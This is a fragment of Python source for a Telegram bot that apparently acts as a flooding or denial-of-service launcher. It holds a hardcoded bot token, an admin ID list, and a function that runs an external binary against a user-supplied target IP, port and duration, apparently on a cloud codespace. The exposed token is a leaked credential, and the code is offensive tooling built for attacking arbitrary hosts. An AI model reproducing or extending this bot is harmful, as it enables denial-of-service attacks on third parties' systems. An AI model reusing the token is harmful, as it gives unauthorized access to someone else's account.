...
# Bot token
TOKEN = '7641201426:AAG7ynhS2rRQAruM900l1--Wmyc4BlXWWa4'
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# Admins list
ADMIN_IDS = [5712886230]  # Replace with actual admin user IDs
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./rahul {target_ip} {target_port} {duration} 900"
    try:
